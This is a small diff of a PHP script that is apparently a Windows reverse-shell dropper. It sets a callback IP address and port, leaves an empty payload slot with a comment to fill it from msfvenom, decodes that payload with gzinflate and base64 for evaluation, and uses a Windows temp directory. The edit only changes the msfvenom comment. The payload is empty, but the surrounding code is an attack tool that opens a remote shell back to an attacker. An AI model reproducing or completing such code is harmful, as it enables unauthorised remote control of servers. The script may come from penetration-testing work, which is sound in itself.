@@ -3,7 +3,7 @@
 header('Content-type: text/plain');
 $ip   = "192.168.1.9"; //change this 
 $port = "1234"; //change this
-$payload = ""; // msfvenom -p windows/.../... LHOST=... ... -f exe
+$payload = ""; // msfvenom -p windows/.../... LHOST=... ... -f exe | base64
 $evalCode = gzinflate(base64_decode($payload));
 $evalArguments = " ".$port." ".$ip;
 $tmpdir ="C:\\windows\\temp";
